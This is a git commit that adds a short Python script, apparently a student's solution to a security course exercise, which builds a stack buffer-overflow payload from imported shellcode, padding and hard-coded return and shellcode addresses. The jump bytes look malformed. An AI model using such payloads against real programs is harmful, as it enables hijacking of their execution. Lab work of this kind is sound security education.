959440a7331602bb79eea790ebc8ebbe0e3dff9c
stevenchiu30801 <steven30801@gmail.com>
2017-09-30 17:17:18 -0400

    upload 2.2.8

---
+++ mp2/files/2.2.8.py
@@ -0,0 +1,6 @@
+from shellcode import shellcode
+from struct import pack
+ret_addr = pack("<I", 0xbffeeb2c)	# address of return addr.
+exp_addr = pack("<I", 0x080f3724)	# address of shellcode
+shellcode = "\xeb\x080f372c" + "A" * 4 + shellcode
+print "A" * 4 + shellcode + " " + "A" * 40 + exp_addr  + ret_addr + " " + "B" * 32
